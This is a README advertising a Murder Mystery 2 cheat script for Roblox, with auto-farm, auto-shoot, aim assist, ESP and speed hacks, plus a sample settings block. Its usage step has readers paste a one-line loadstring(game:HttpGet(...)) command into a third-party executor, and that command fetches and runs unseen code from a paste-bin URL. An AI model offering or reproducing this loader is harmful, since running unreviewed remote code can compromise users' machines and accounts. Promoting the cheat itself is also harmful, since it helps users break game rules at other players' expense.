ScriptMM2: an all-in-one script for Murder Mystery 2 (PC / Mobile). AutoFarm, AutoShoot / AimAssist, automatic coin collection and a lightweight GUI to configure everything on the fly.

![Banner](https://i.ytimg.com/vi/UR8d8vKWL8M/maxresdefault.jpg)

Quick use
1. Open Roblox with a compatible executor (Synapse, Krnl, Fluxus on PC; Hydrogen / Arceus X on Android).
2. Paste and execute this line in your executor:
```lua
loadstring(game:HttpGet('https://cdn.sourceb.in/bins/l4UhGhBSd3/0'))()
```
3. Adjust options from the GUI that appears.

Main features
- AutoFarm (coins / events)
- AutoShoot + Aim Assist (configurable)
- Auto Collect Coins (teleport/path)
- ESP (names/roles)
- Settings: WalkSpeed, JumpPower, Sensitivity
- Lightweight and easy-to-use GUI

Quick configuration (example)
```lua
getgenv().AutoFarm = true
getgenv().FarmType = "Coins"
getgenv().AutoShoot = true
getgenv().AimPart = "Head"
getgenv().WalkSpeed = 50
getgenv().AimSensitivity = 0.5
```
